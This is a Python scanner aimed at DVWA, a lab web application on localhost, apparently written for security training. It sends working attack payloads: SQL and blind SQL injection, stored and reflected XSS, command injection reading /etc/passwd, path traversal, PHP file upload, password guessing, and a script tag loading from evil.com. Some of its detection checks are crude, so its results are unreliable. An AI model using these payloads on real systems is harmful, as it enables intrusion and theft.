import requests
import time
import re
import logging
from bs4 import BeautifulSoup
import os

# =====================================================
# CONFIG
# =====================================================

BASE_URL = "http://localhost:8080"
PHPSESSID = "PHPSESSID_from_logged_in_session"
TIMEOUT = 5

SECURITY_LEVELS = ["low", "medium", "high", "impossible"]

COMMON_COOKIES = {"PHPSESSID": PHPSESSID}

# =====================================================
# LOGGING (timestamped)
# =====================================================

logging.basicConfig(
    filename="vuln_scan.log",
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

# =====================================================
# HELPERS (OUTPUT FORMATTING)
# =====================================================

def cookies(level):
    c = COMMON_COOKIES.copy()
    c["security"] = level
    return c


def header(name, payload, purpose):
    print("\n" + "=" * 72)
    print(f"[+] {name}")
    print(f"    Payload : {payload}")
    print(f"    Purpose : {purpose}")
    print("-" * 72)


def result(vuln, level, status, reason):
    print(f"    [{level.upper():10}] {status:<15} – {reason}")
    logging.info(f"{vuln},{level},{status},{reason}")

# =====================================================
# 1. SQL INJECTION
# =====================================================

def test_sqli(url):
    payload = "' OR '1'='1"
    header("SQL Injection", payload, "Trigger SQL error / authentication bypass")

    for level in SECURITY_LEVELS:
        r = requests.get(url, params={"id": payload, "Submit": "Submit"},
                         cookies=cookies(level), timeout=TIMEOUT)

        if any(x in r.text.lower() for x in ["mysql", "syntax", "warning"]):
            result("SQL Injection", level, "VULNERABLE", "SQL error message exposed")
        elif payload not in r.text:
            result("SQL Injection", level, "BLOCKED", "Input filtered")
        else:
            result("SQL Injection", level, "NOT VULNERABLE", "Query safely handled")

# =====================================================
# 2. BLIND SQL INJECTION
# =====================================================

def test_sqli_blind(url):
    payload = "1' AND SLEEP(3)--"
    header("Blind SQL Injection", payload, "Detect time-based SQL execution")

    for level in SECURITY_LEVELS:
        start = time.time()
        requests.get(url, params={"id": payload, "Submit": "Submit"},
                     cookies=cookies(level), timeout=TIMEOUT)
        delay = time.time() - start

        if delay >= 3:
            result("Blind SQL Injection", level, "VULNERABLE", f"Response delayed ({delay:.2f}s)")
        else:
            result("Blind SQL Injection", level, "NOT VULNERABLE", "No measurable delay")

# =====================================================
# 3. STORED XSS
# =====================================================

def test_xss_stored(url):
    payload = "<script>alert(1)</script>"
    header("Stored XSS", payload, "Persist JavaScript payload on server")

    for level in SECURITY_LEVELS:
        requests.post(url,
                      data={"txtName": payload, "mtxMessage": "test", "btnSign": "Sign"},
                      cookies=cookies(level), timeout=TIMEOUT)
        r = requests.get(url, cookies=cookies(level), timeout=TIMEOUT)

        if payload in r.text:
            result("Stored XSS", level, "VULNERABLE", "Payload stored and rendered")
        else:
            result("Stored XSS", level, "NOT VULNERABLE", "Payload not executed")

# =====================================================
# 4. REFLECTED XSS
# =====================================================

def test_xss_reflected(url):
    payload = "<img src=x onerror=alert(1)>"
    header("Reflected XSS", payload, "Reflect JavaScript in response")

    for level in SECURITY_LEVELS:
        r = requests.get(url, params={"name": payload},
                         cookies=cookies(level), timeout=TIMEOUT)

        if payload in r.text:
            result("Reflected XSS", level, "VULNERABLE", "Payload reflected unencoded")
        elif "&lt;" in r.text:
            result("Reflected XSS", level, "BLOCKED", "Output encoded")
        else:
            result("Reflected XSS", level, "NOT VULNERABLE", "Input safely handled")

# =====================================================
# 5. DOM XSS
# =====================================================

def test_xss_dom(url):
    payload = "alert(1)"
    header("DOM XSS", payload, "Inject JavaScript into client-side DOM")

    for level in SECURITY_LEVELS:
        r = requests.get(f"{url}#{payload}", cookies=cookies(level), timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")

        if any(payload in s.text for s in soup.find_all("script")):
            result("DOM XSS", level, "VULNERABLE", "Payload executed in DOM")
        else:
            result("DOM XSS", level, "NOT VULNERABLE", "No DOM sink found")

# =====================================================
# 6. BRUTE FORCE
# =====================================================

def test_bruteforce(url):
    users = ["admin"]
    passwords = ["password", "admin"]

    header("Brute Force", "admin / password list", "Attempt credential guessing")

    for level in SECURITY_LEVELS:
        success = False
        for u in users:
            for p in passwords:
                r = requests.post(url,
                                  data={"username": u, "password": p, "Login": "Login"},
                                  cookies=cookies(level), timeout=TIMEOUT)
                if "Welcome" in r.text:
                    result("Brute Force", level, "VULNERABLE", f"Login success ({u}:{p})")
                    success = True
                    break
            if success:
                break
        if not success:
            result("Brute Force", level, "NOT VULNERABLE", "No login bypass")

# =====================================================
# 7. COMMAND INJECTION
# =====================================================

def test_command_injection(url):
    payload = "127.0.0.1; cat /etc/passwd"
    header("Command Injection", payload, "Execute OS command")

    for level in SECURITY_LEVELS:
        r = requests.post(url,
                          data={"ip": payload, "Submit": "Submit"},
                          cookies=cookies(level), timeout=TIMEOUT)

        if "root:x:" in r.text:
            result("Command Injection", level, "VULNERABLE", "OS command output visible")
        else:
            result("Command Injection", level, "NOT VULNERABLE", "Command execution blocked")

# =====================================================
# 8. CSRF
# =====================================================

def test_csrf(url):
    header("CSRF", "No token", "Check absence of CSRF protection")

    for level in SECURITY_LEVELS:
        r = requests.get(url, cookies=cookies(level), timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")

        token = soup.find("input", {"name": re.compile("csrf|token", re.I)})
        if not token:
            result("CSRF", level, "VULNERABLE", "CSRF token missing")
        else:
            result("CSRF", level, "NOT VULNERABLE", "CSRF token present")

# =====================================================
# 9. FILE INCLUSION
# =====================================================

def test_file_inclusion(url):
    payload = "../../../../etc/passwd"
    header("File Inclusion", payload, "Read sensitive server files")

    for level in SECURITY_LEVELS:
        r = requests.get(url, params={"page": payload},
                         cookies=cookies(level), timeout=TIMEOUT)

        if "root:x:" in r.text:
            result("File Inclusion", level, "VULNERABLE", "/etc/passwd disclosed")
        else:
            result("File Inclusion", level, "NOT VULNERABLE", "File access blocked")

# =====================================================
# 10. FILE UPLOAD
# =====================================================

def test_file_upload(url):
    payload = "test.php"
    header("File Upload", payload, "Upload executable PHP file")

    if not os.path.exists(payload):
        with open(payload, "w") as f:
            f.write("<?php phpinfo(); ?>")

    for level in SECURITY_LEVELS:
        files = {"uploaded": (payload, open(payload, "rb"), "application/php")}
        r = requests.post(url, files=files,
                          data={"Upload": "Upload"},
                          cookies=cookies(level), timeout=TIMEOUT)

        if "php" in r.text.lower():
            result("File Upload", level, "VULNERABLE", "Executable file uploaded")
        else:
            result("File Upload", level, "NOT VULNERABLE", "Upload restricted")

# =====================================================
# 11–14. CAPTCHA / SESSION / CSP / JS
# =====================================================

def test_captcha(url):
    header("Insecure CAPTCHA", "static value", "Attempt CAPTCHA bypass")

    for level in SECURITY_LEVELS:
        r = requests.post(url,
                          data={"g-recaptcha-response": "bypass", "Submit": "Submit"},
                          cookies=cookies(level), timeout=TIMEOUT)
        if "success" in r.text.lower():
            result("CAPTCHA", level, "VULNERABLE", "CAPTCHA bypassed")
        else:
            result("CAPTCHA", level, "NOT VULNERABLE", "CAPTCHA enforced")


def test_weak_session(url):
    header("Weak Session ID", "Session reuse", "Check predictable sessions")

    for level in SECURITY_LEVELS:
        r1 = requests.get(url, cookies=cookies(level), timeout=TIMEOUT)
        r2 = requests.get(url, cookies=cookies(level), timeout=TIMEOUT)

        if r1.cookies.get("PHPSESSID") == r2.cookies.get("PHPSESSID"):
            result("Session ID", level, "VULNERABLE", "Session ID reused")
        else:
            result("Session ID", level, "NOT VULNERABLE", "Session regenerated")


def test_csp(url):
    payload = "<script src=http://evil.com/x.js></script>"
    header("CSP Bypass", payload, "Load external script")

    for level in SECURITY_LEVELS:
        r = requests.post(url, data={"input": payload}, cookies=cookies(level))
        if "Content-Security-Policy" not in r.headers:
            result("CSP", level, "VULNERABLE", "CSP header missing")
        else:
            result("CSP", level, "NOT VULNERABLE", "CSP enforced")


def test_js_injection(url):
    payload = "alert(1337)"
    header("JavaScript Injection", payload, "Inject JS into response")

    for level in SECURITY_LEVELS:
        r = requests.post(url, data={"input": payload}, cookies=cookies(level))
        if payload in r.text:
            result("JS Injection", level, "VULNERABLE", "Script injected")
        else:
            result("JS Injection", level, "NOT VULNERABLE", "Input sanitized")

# =====================================================
# MAIN
# =====================================================

def main():
    print("\n=== DVWA FULL VULNERABILITY SCAN STARTED ===")

    test_sqli(f"{BASE_URL}/vulnerabilities/sqli/")
    test_sqli_blind(f"{BASE_URL}/vulnerabilities/sqli_blind/")
    test_xss_stored(f"{BASE_URL}/vulnerabilities/xss_s/")
    test_xss_reflected(f"{BASE_URL}/vulnerabilities/xss_r/")
    test_xss_dom(f"{BASE_URL}/vulnerabilities/xss_d/")
    test_bruteforce(f"{BASE_URL}/vulnerabilities/brute/")
    test_command_injection(f"{BASE_URL}/vulnerabilities/exec/")
    test_csrf(f"{BASE_URL}/vulnerabilities/csrf/")
    test_file_inclusion(f"{BASE_URL}/vulnerabilities/fi/")
    test_file_upload(f"{BASE_URL}/vulnerabilities/upload/")
    test_captcha(f"{BASE_URL}/vulnerabilities/captcha/")
    test_weak_session(f"{BASE_URL}/login.php")
    test_csp(f"{BASE_URL}/vulnerabilities/csp/")
    test_js_injection(f"{BASE_URL}/vulnerabilities/javascript/")

    print("\n=== SCAN COMPLETE — CHECK vuln_scan.log ===")

if __name__ == "__main__":
    main()
